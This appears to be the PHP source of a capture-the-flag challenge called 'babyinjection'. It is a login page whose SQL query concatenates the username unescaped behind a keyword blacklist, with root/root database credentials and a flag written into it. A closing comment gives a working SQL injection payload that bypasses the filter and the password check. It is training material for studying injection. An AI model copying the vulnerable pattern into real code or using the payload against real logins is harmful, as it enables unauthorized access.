<!DOCTYPE html>
<html>
<head>
    <title>babyinjection</title>
</head>
<body>
<a href = "./index.txt">Show Source</a>
</body>
</html>

<?php
error_reporting(0);

$conn = mysqli_connect('127.0.0.1', 'root', 'root', 'babyinjection');
if(!$conn){
    die("database error");
}

if (!isset($_POST['username']) || !isset($_POST['passwd'])) {
    echo 'Login and get the flag';
	echo '<form action="" method="post">'."<br/>";
	echo '<input name="username" type="text" placeholder="username"/>'."<br/>";
	echo '<input name="passwd" type="text" placeholder="passwd"/>'."<br/>";
	echo '<input type="submit" ></input>'."<br/>";
	echo '</form>'."<br/>";
    die;
}

$flag = 'HITCTF{9989035e268342af1f40f26aad336623}';
$filter = "and|select|from|where|union|join|sleep|benchmark|,|\(|\)|like|rlike|regexp|limit|or";

$username = $_POST['username'];
$passwd = $_POST['passwd'];
if (preg_match("/".$filter."/is",$username)==1){
    die("Hacker hacker hacker~");
}
if (preg_match("/".$filter."/is",$passwd)==1){
    die("Hacker hacker hacker~");
}

$query = "SELECT * FROM users WHERE username='{$username}';";
$query = mysqli_query($conn, $query);
if (mysqli_num_rows($query) == 1){
    $result = mysqli_fetch_array($query);
    if ($result['passwd'] == $passwd){
        die('you did it and this is your flag: '.$flag);
    }
    else{
        die('Wrong password');
    }
}
else{
    die('Wrong username');
}

// payload: username='=0 GROUP BY passwd WITH ROLLUP HAVING passwd <=> nuLL %23&passwd=